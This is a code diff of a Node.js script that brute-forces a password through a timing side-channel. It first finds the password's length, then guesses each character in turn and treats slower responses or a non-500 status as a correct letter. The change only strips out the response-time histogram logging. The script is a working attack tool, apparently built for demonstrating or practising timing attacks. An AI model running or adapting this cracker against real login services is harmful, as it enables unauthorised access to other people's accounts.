@@ -1,5 +1,4 @@
 var request = require('request')
-var histogram = require('ascii-histogram');
 
 function nextChar(c) {
     if (c == 'z') {
@@ -41,33 +40,25 @@ function nextPassword(password, pos) {
     return password.substr(0, pos) + letter + password.substr(pos + 1)
 }
 
-function tryPassword(password, pos, last, time, responseTimes, callback) {
+function tryPassword(password, pos, last, time, callback) {
     timedRequest(getParams(password), function(err, res, body) {
-        responseTimes[password] = res.time;
-
         if (res.statusCode !== 500 || res.time > last + time) {
             console.log("The letter number " + (pos + 1) + " is " + password[pos])
-
-            if (res.statusCode === 500) {
-                console.log(histogram(responseTimes));
-            }
-
             if (pos + 1 == password.length) {
                 return callback(password)
             }
-            return tryPassword(password, pos + 1, res.time, time, { }, callback)
+            return tryPassword(password, pos + 1, res.time, time, callback)
         }
         if (password[pos] == 'Z') {
             return callback(null, "I couldn't crack the letter number " + (pos + 1) + " of the password :(")
         }
-
-        tryPassword(nextPassword(password, pos), pos, res.time, time, responseTimes, callback)
+        tryPassword(nextPassword(password, pos), pos, res.time, time, callback)
     })
 }
 
 tryLength('', 50, function(password, last) {
     console.log("I've found the length of the password! It's " + password.length + " characters long.")
-    tryPassword(password, 0, last, 50, { }, function(password, error) {
+    tryPassword(password, 0, last, 50, function(password, error) {
         if (error) {
             return console.log(error)
         }
